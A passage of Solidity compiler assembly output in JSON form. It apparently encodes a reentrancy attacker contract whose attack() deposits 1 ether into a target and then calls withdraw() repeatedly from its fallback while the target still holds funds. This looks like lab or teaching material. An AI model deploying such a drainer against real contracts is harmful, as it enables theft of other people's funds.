									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 153,
									"end": 595,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212203ce1937d5845b34d18b73de438ce7138fc4ce89252e8fa6b540fc3218d7973a964736f6c63430008180033",
									".code": [
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 153,
											"end": 595,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 540,
											"end": 547,
											"name": "PUSH",
											"source": 0,
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 522,
											"end": 527,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 522,
											"end": 527,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 522,
											"end": 527,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 522,
											"end": 527,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 522,
											"end": 527,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 522,
											"end": 527,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 514,
											"end": 536,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 514,
											"end": 536,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 514,
											"end": 536,
											"name": "BALANCE",
											"source": 0
										},
										{
											"begin": 514,
											"end": 547,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 510,
											"end": 588,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 510,
											"end": 588,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 562,
											"end": 567,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 567,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 562,
											"end": 567,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 562,
											"end": 567,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 562,
											"end": 567,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 562,
											"end": 576,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 562,
											"end": 576,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 562,
											"end": 576,
											"name": "PUSH",
											"source": 0,
											"value": "3CCFD60B"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 562,
											"end": 578,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 562,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 510,
											"end": 588,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 510,
											"end": 588,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 153,
											"end": 595,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 320,
											"end": 464,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 320,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 320,
											"end": 464,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 320,
											"end": 464,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 320,
											"end": 464,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 385,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 372,
											"end": 381,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 372,
											"end": 392,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 372,
											"end": 392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 364,
											"end": 393,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 364,
											"end": 393,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 364,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 364,
											"end": 393,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 364,
											"end": 393,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 364,
											"end": 393,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 364,
											"end": 393,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 402,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 407,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 402,
											"end": 407,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 402,
											"end": 407,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 402,
											"end": 415,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 402,
											"end": 415,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 402,
											"end": 415,
											"name": "PUSH",
											"source": 0,
											"value": "D0E30DB0"
										},
										{
											"begin": 423,
											"end": 430,
											"name": "PUSH",
											"source": 0,
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 402,
											"end": 433,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 402,
											"end": 433,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 442,
											"end": 447,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 447,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 442,
											"end": 447,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 442,
											"end": 447,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 442,
											"end": 447,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 442,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 442,
											"end": 456,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 442,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "3CCFD60B"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
